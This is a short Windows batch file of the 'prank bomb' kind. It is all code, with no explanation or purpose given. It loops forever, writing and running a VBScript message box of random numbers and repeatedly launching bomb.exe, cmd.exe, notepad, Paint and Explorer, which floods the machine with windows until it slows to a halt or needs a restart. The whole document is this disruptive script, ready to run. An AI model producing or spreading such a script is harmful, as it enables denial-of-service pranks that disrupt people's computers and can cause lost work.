@echo off
:0
echo msgbox "%random%%random%%random%%random%%random%%random%%random%" >x.vbs
start x.vbs
ping localhost -n 2
start bomb.exe
ping localhost -n 2
start cmd.exe
ping localhost -n 2
start notepad.exe
ping localhost -n 2
start mspaint.exe
ping localhost -n 2
start explorer.exe
ping localhost -n 2
goto 0